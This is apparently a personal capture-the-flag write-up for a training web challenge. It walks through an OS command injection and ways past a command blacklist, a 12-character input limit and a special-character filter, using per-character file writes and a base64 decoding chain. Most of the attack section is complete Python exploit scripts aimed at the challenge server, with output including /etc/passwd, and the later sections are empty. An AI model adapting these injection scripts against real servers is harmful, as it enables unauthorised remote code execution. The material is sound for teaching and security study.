---
tags:
  - 🚩
up:
  - "[[02 - Remote Code Execution]]"
  - "[[02 - (incomplete) Data Exfiltration]]"
platform: BKSEC - Training
difficulty: Hard
creation_date: 2026-02-28
last_modified: 2026-02-28
---

# 🚩 [[BKSEC - Parrot-revenge]]
**Primary:** [[01 - Web Security]]

**Secondary:** [[02 - Remote Code Execution]], [[02 - (incomplete) Data Exfiltration]]

**Related Techniques:** [[(incomplete) OS Command Injection - Linux]], [[(incomplete) Living Off The Land]]

**Related Tools:** [[(incomplete) BurpSuite]]


## Executive Summary
* **URL:** `http://103.77.175.40:11121`
* **OS:** Linux 6.8.0-71-generic
* **Key Technique:** Fuzzing the input reveals a **OS command injection vulnerability**, then create a python script, and leverage the `base64` and `sed` commands in the server to achieve **RCE**.
* **Status:** `In Progress`

---

## Reconnaissance
### Web Enumeration
The URL leads to a website that has an input field.

![[Pasted image 20260228210433.png]]

Upon reading the source code, inputting into the field will send a POST request with a parameter called `word` to itself

![[Pasted image 20260228210701.png]]

Fuzzing the field with special characters (since the last Parrot challenges always starts with fuzzing them) it revealed that the server only accept these special characters: `\`, `/`, `-`, `+`, ` `, `<` and `>`.

However, these special character behave differently. While `/` and `-` will be reflected normally, `\` will be **stripped off** from the string when it is reflected back (`hel\lo -> hello`); ` ` will **returned nothing** when injected alone (I could not highlight return field) but it was reflected normally when being put between **two 2 characters** (`a b -> a b`); `+` behaved the same as ` ` but in **a literal sense**, meaning it will be changed to a ` ` when being reflected back (`2+2 -> 2 2`).

The input field also blocked certain command like `ls`, but other command like `id` or `whoami` was reflected back, so I'm certain that the backend was blacklisting commands, meaning there are ways we can bypass this.

I spend some more time testing and got that the input also only receive input that is **less than 12 characters long**.

---

## OS Command Injection
Firing up **BurpSuite** and starts testing commands. I tried URL encodings and double URLencodings to bypass the blacklist but it did not worked.

![[Pasted image 20260228212856.png]]

![[Pasted image 20260228212913.png]]

However, this means that the backend check the length of the input after URL encode them (since URL encoding of the same string still passed). This means I can input a lot more different types of characters than I initially thought. The prementioned special characters after being URL encodes still behaves the same way.

![[Pasted image 20260228213224.png]]

I play around the `\` a bit more since in Linux, `\` is the escape character. If the command is `echo $input` then \ will be treated as such. This theory can explain the its behavior when being stripped off when being in between 2 characters. So I test the payload `hell\\o`:

![[Pasted image 20260228213754.png]]

I immediately try with the `+`:

![[Pasted image 20260228213852.png]]

The results tells me that the `\` escaped the `+` but it was somehow still treated as a ` `. Maybe in the background there is a filter that completely filtered the `+` sign from the input and replace it with a ` `, the `\` then escape the ` ` .  I tried around some payload to figure out a way to slip my `+` in but I decided to move on with what I have at hand and leave the `+` problem for now.

As for the `>` and `<` I think the reason it was not returned is because in Linux they are called **Input Redirection**, therefore when I input them into the `echo` command, they were not printed. If I add a `\` before them they will be printed.

![[Pasted image 20260228215910.png]]

Now that I understand the way each of the special character I have at hand works, I starts crafting the payloads.

**Theory:**
The backend was using **PHP version 8.0.30**, so maybe it used the `exec()` function to executes commands. The backend may have something like this:
```php
# Decode URL encodings
# Replace `+` with ` `
# Filter commands and special chars
$cmd = "echo " . $filtered_input
exec($cmd, $output)
```

If this is the case, since I cannot use `;`, `|`, `&&` to interrupt the `echo` command, I can use the newline character `\n` to do so since URL encodings allow me to do that.

### 1. Bypass the Command Filter
**Payload 1:** `%0Aid`

![[Pasted image 20260228221403.png]]

It worked beautifully, so now I can partly bypass the filter. Now I need to enumerate the system, and I have to keep my payload under 12 characters. 

Strictly following the theory, I can inject commands if I add a `\` between its characters (like `l\s`) if the filter does not escape its characters first, I can pass through, and execute command since in Linux `l\s` is treated the same as `ls` as a command on a separate line.

**Payload 2:** `%0Al\s`

![[Pasted image 20260228222356.png]]

Now I can see the files, however, I can not read them without using a `.` or a `*`, furthermore, the length of the file is too long. `index.php` has 9 characters, plus 1 newline character at the beginning of the payload gives me 10, there is no way I can add a command and a space with only 2 characters left. I also can not use a wildcard like `*` to reduce the name of the file, either.

I look around the server with the `ls` command a bit more

**Payload 3:** `%0Al\s+-la+/`

![[Pasted image 20260228223422.png]]

I can see the first flag right there in the `/flagnyQJe` file, it does not have any `.` so I should be able to extract it only if I can bypass the 12-character filter. 

### 2. Bypass the Length Filter
Using `ls -la` and `ls -la /` I can see that there are 2 folders I can write in that is the `/tmp` folder and the `./images` folder. I decide to look into the `/tmp` folder. Only to find junk files from other participants.

![[Pasted image 20260228224803.png]]

I check other folder that has short names `/usr`,  `/var`, `home`, `mnt`, `opt` but most of them are completely clean with no files, some other folders hold nested folders that I just cannot read because of the length filter, the most valuable folder is `/bin`, since it normally in `PATH` so I should be able to know some of the command that the server has:

**Payload 4:** `%0Al\s+/bin`

![[Pasted image 20260228225855.png]]

After testing some more, I reached a conclusion that I cannot bypass the 12-character filter with only 1 request, I need to find a way to pass my command with multiple requests. To do so I need to store the fragments of my command somewhere then use the `sh` command to execute it.

In Linux, `\` is also treated as a `Line Continuation`, if I have a file that is like:
```bash
c\
a\
t\
 \
/\
f\
l\
a\
g\
```

I can definitely `cat` the flag without triggering the filter since all of the characters are injected individually and the special characters used are not the blocked ones.

Utilizing the underlying `echo` command that might already be in the codebase, I can create a file in `/tmp`.

**Payload 5:** `b\\>/tmp/k`

![[Pasted image 20260228231216.png]]

![[Pasted image 20260228231240.png]]

The payload will combine with `echo` to be `echo b\\>/tmp/k` this will override the `/tmp/k` or create a new one if it does not exist without having to create one with a `touch` command.

Repeat the payload many times and execute the file using `%0As\h+/tmp/k`

```payload
f\\>/tmp/k
l\\>>/tmp/k
a\\>>/tmp/k
g\\>>/tmp/k
\+\\>>/tmp/k
/\\>>/tmp/k
F\\>>/tmp/k
l\\>>/tmp/k
a\\>>/tmp/k
n\\>>/tmp/k
y\\>>/tmp/k
Q\\>>/tmp/k
J\\>>/tmp/k
e\\>>/tmp/k
```

---
## Remote Code Execution
### 1. Automate the process
Using the trick above, I can execute many commands, however, the longer the commands the more time-consuming it gets so I need a script to automate the request sending and result extracting for me.

```python
import requests
import time
from bs4 import BeautifulSoup
  
URL = "http://103.77.175.40:11121/"
  
def send_raw_payload(payload):
    # Sending the raw string body so requests doesn't mess with backslashes or %0A
    body = "word=" + payload
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    print(f"[*] Sending: {payload}")
    try:
        response = requests.post(URL, data=body, headers=headers, timeout=5)
        return response.text
    except requests.exceptions.Timeout:
        return "[!] Request timed out"
  
def build_file(filepath, content):
    print(f"\n[+] Building {filepath}...")
    for i, char in enumerate(content):
        is_first = (i == 0)
        redirect = ">" if is_first else ">>"
  
        # Escape characters
        if char == ' ':
            base = r'\+'
        elif char == '+':
            base = '%2B'
        elif char == '>':
            base = r'\>'
        elif char == '<':
            base = r'\<'
        else:
            base = char
  
        # \\\\ because Python also uses \ as escape character
        payload = f"{base}\\\\{redirect}{filepath}"
        send_raw_payload(payload)
        time.sleep(0.3)
  
def execute_payload(cmd):
    print(f"[+] Command: {cmd}")
    build_file("/tmp/k", cmd)
  
    result = send_raw_payload(r"%0As\h+/tmp/k")
    print("\n" + "="*50)
    print("[+] SERVER RESPONSE:")
    start_tag = '<main class="form-signin w-50 m-auto">'
    end_tag = '<form method="POST">'
    start_idx = result.find(start_tag)
    end_idx = result.rfind(end_tag)
    if start_idx != -1 and end_idx != -1 and start_idx < end_idx:
        extracted_text = result[start_idx + len(start_tag) : end_idx]
        clean_text = extracted_text.replace('<br>', '\n').replace('<br/>', '\n').replace('<br />', '\n')
        print(clean_text.strip())
    else:
        print("[!] Target boundaries not found! Printing raw output:\n")
        print(result)
    print("="*50)
  
if __name__ == "__main__":
    target_command = "ls -la"
    execute_payload(target_command)
```

With this code, I can quickly do more enumeration like `cat /etc/passwd`, `env`, etc.

```powershell
[+] Command: cat /etc/passwd
==================================================
[+] SERVER RESPONSE:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
==================================================
```

However, to truly achieve RCE I need to completely bypass the special characters filter.

### 2. Bypass the Special Characters Filter

**Thought Process**
In order to completely bypass the special character starts I considering obfuscation. Instead of sending the raw `*` I can choose to send its encoding that does not contain the forbidden characters like hexadecimal encoding `\x2a` or octal encoding `\052`. I can encode special characters with their encoding and send the command the contains the special character to a `printf` command in decoder file `/tmp/d` file, when I execute the decoder, `printf` will print the command that contains the encoded characters to another file `/tmp/k`, I can then execute the `/tmp/k` to achieve RCE.

![[IMG_20260301_001031.jpg]]

However, this trick has a problem that is every time I inject an octal or hexadecimal encoding I have to add a `\\\` line to `/tmp/d` the shortest payload to do so is `\\\\\\>>/tmp/d` has a length that is greater than 12, this making the injection impossible.

I decide to change to base64 encoding, I have to address a problem that is the encoding uses `+` signs that I don't really understand how the filter work with it. 

To resolve this problem, I come up with a plan:
- The command will be base64 encoded completely (so that I can reduce the complexity of the decoder script)
- Any `+` will be replaced with `-` (to bypass the `+` stripping)
- The modified string will be placed inside an `echo` command that will be sent to `/tmp/p` the server (`echo {modified_b64_string} > /tmp/b`)
- Executing `/tmp/p` will print the modified base64 string to `/tmp/b`, a swapper in `/tmp/s` that I will have injected beforehand will swap all `-` with `+` and save the result to `/tmp/c`
- A decoder in `/tmp/d` that I will also have injected beforehand will decode the base64 string in `/tmp/c` and save the result to `/tmp/k`

![[IMG_20260301_005115.jpg]]

In order for the plan to work I must first upload the decoder script first to the server to `/tmp/d`. The script is:
```bash
base64 -d </tmp/c>/tmp/k
```
Since it has no forbidden special characters, I can just use the python script I created before, modify it a bit to upload it to the server.

```python
# inject_decoder.py
import requests
import time
from bs4 import BeautifulSoup
import base64
  
URL = "http://103.77.175.40:11121/"
  
def send_raw_payload(payload):
    # Sending the raw string body so requests doesn't mess with our backslashes or %0A
    body = "word=" + payload
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    print(f"[*] Sending: {payload}")
    try:
        response = requests.post(URL, data=body, headers=headers, timeout=5)
        return response.text
    except requests.exceptions.Timeout:
        return "[!] Request timed out"
  
def build_file(filepath, content):
    print(f"\n[+] Building {filepath}...")
    for i, char in enumerate(content):
        is_first = (i == 0)
        redirect = ">" if is_first else ">>"
        if char == ' ':
            base = r'\+'
        elif char == '+':
            base = '%2B'
        elif char == '>':
            base = r'\>'
        elif char == '<':
            base = r'\<'
        else:
            base = char
        payload = f"{base}\\\\{redirect}{filepath}"
        send_raw_payload(payload)
        time.sleep(0.3)
  
def execute_payload(cmd):
    print(f"[+] Command: {cmd}")  
    build_file("/tmp/d", cmd)
  
if __name__ == "__main__":
    target_command = "base64 -d </tmp/c>/tmp/k"
    execute_payload(target_command)
```

Only when I have the decoder, I can upload the swapper script. This is because the swapper script uses special characters that is forbidden, I need to convert this to base64 form.
```bash
tr '-' '\\053'< /tmp/b>/tmp/c && cp /tmp/k /tmp/s && sed -i 's/&&.*//' /tmp/s
```

The first version of this script contains a `+`, so I slightly tweaked the space between characters of the command to make the `+` disappear. The part `cp /tmp/k /tmp/s && sed -i 's/&&.*//' /tmp/s` was added as the decoder dump the decoded string to `/tmp/k` hence to move the script to `/tmp/s` I need to add a copy command and a script that delete everything from the first `&&` in the to the end of `/tmp/s`, this will result in the script `tr '-' '\\053'< /tmp/b>/tmp/c ` in the `/tmp/s` file.

```python
# inject_swapper.py
import requests
import time
import base64
  
URL = "http://103.77.175.40:11121/"
  
def send_raw_payload(payload):
    # Sending the raw string body so requests doesn't mess with our backslashes or %0A
    body = "word=" + payload
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    print(f"[*] Sending: {payload}")
    try:
        response = requests.post(URL, data=body, headers=headers, timeout=5)
        return response.text
    except requests.exceptions.Timeout:
        return "[!] Request timed out"
  
def build_file(filepath, content):
    print(f"\n[+] Building {filepath}...")
    for i, char in enumerate(content):
        is_first = (i == 0)
        redirect = ">" if is_first else ">>"
        
        if char == ' ':
            base = r'\+'
        elif char == '+':
            base = '%2B'
        elif char == '>':
            base = r'\>'
        elif char == '<':
            base = r'\<'
        else:
            base = char
        payload = f"{base}\\\\{redirect}{filepath}"
        send_raw_payload(payload)
        time.sleep(0.3)
        
def build_base64_insert_file(filepath, content, destfile):
    insert_cmd = f"echo {content} > {destfile}"
    build_file(filepath, insert_cmd)
  
def execute_b64_payload(cmd):
    # Base64 Encode the command
    b64_string = base64.b64encode(cmd.encode()).decode()
    print(f"[+] Command: {cmd}")
    print(f"[+] Base64:  {b64_string}")
    
    # Store the echo command to /tmp/p
    passer_cmd = f"echo {b64_string} > /tmp/c"
    build_file("/tmp/p", passer_cmd)
    
    # Print the base64 string to /tmp/c
    send_raw_payload(r"%0As\h+/tmp/p")
    time.sleep(1)
    
    # Decode the base64 string and dump it to /tmp/k
    send_raw_payload(r"%0As\h+/tmp/d")
    time.sleep(1)
    
    # Copy the swapper logic to /tmp/s and clean it up
    send_raw_payload(r"%0As\h+/tmp/k")

if __name__ == "__main__":

    target_command = "tr '-' '\\053'< /tmp/b>/tmp/c && cp /tmp/k /tmp/s && sed -i 's/&&.*//' /tmp/s"

    execute_b64_payload(target_command)
```

After I have everything, I can now finally achieve RCE on the server

```python
# inject_command.py
import base64
from bs4 import BeautifulSoup
import requests
import time
  
URL = "http://103.77.175.40:11121/"
  
def send_raw_payload(payload):
    body = "word=" + payload
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    print(f"[*] Sending: {payload}")
    try:
        response = requests.post(URL, data=body, headers=headers, timeout=5)
        return response.text
    except requests.exceptions.Timeout:
        return "[!] Request timed out (Good news for reverse shells!)"
  
def build_file(filepath, content):
    print(f"\n[+] Building {filepath}...")
    for i, char in enumerate(content):
        is_first = (i == 0)
        redirect = ">" if is_first else ">>"
        if char == ' ':
            base = r'\+'
        elif char == '>':
            base = r'\>'
        elif char == '<':
            base = r'\<'
        elif char == '\\':
            base = r'\\'
        else:
            base = char
        payload = f"{base}\\\\{redirect}{filepath}"
        send_raw_payload(payload)
        time.sleep(0.3)
  
def execute_command(cmd):
    print(f"[+] Original Command: {cmd}")
    # Encode, strip the '=' padding, and swap '+' with '-'
    b64_string = base64.b64encode(cmd.encode()).decode()
    b64_string = b64_string.replace('=', '').replace('+', '-')
    print(f"[+] Modified Base64:  {b64_string}")

    #1. Build the passer file
    passer_cmd = f"echo {b64_string} > /tmp/b"
    build_file("/tmp/p", passer_cmd)
    
    # 2. Execute the chain!
    print("\n[+] Executing Passer (/tmp/p)...")
    send_raw_payload(r"%0As\h+/tmp/p")
    time.sleep(1)
    
    print("\n[+] Executing Swapper (/tmp/s)...")
    send_raw_payload(r"%0As\h+/tmp/s")
    time.sleep(1)
    
    print("[+] Executing Decoder (/tmp/d)...")
    send_raw_payload(r"%0As\h+/tmp/d")
    time.sleep(1)
    
    print("[+] Executing Final Payload (/tmp/k)...")
    result = send_raw_payload(r"%0As\h+/tmp/k")
    
    # Formatting the Returned Results
    print("\n" + "="*50)
    print("[+] SERVER RESPONSE:")
    
    start_tag = '<main class="form-signin w-50 m-auto">'
    end_tag = '<form method="POST">'
    
    start_idx = result.find(start_tag)
    end_idx = result.rfind(end_tag)
    
    if start_idx != -1 and end_idx != -1 and start_idx < end_idx:
        extracted_text = result[start_idx + len(start_tag) : end_idx]
        clean_text = extracted_text.replace('<br>', '\n').replace('<br/>', '\n').replace('<br />', '\n')
        print(clean_text.strip())
    
    else:
        print("[!] Target boundaries not found! Printing raw output:\n")
        print(result)
    
    print("="*50)
  
if __name__ == "__main__":
    target_command = """cat /f*"""
    execute_command(target_command)
```

---
## Finding the Second Flag

---

## Loot & Flags

---

**References:** [Link](https://www.google.com/search?q=url)